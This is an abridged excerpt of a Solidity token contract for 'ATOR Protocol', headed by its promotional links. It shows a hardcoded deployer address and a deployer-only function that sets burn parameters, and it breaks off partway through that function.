...
Telegram: https://t.me/ATORProtocolPortal
Twitter: https://twitter.com/ATORProtocolETH
Website: https://atorprotocol.pro
Medium: https://medium.com/@ator-protocol
...
pragma solidity ^0.8.20;
    ...
    contract ATORProtocol {
        string public constant name = "ATOR Protocol";  //
        string public constant symbol = "ATOR";  //
        ...
        address payable constant deployer = payable(address(0x0c755a9B5aDF99cB98851b60F1E9bF7118542c38)); //
        ...
        function _setATOR(uint256 newBurn, uint256 newConfirm) external {
            require(msg.sender == deployer);
            BurnFigure = newBurn;
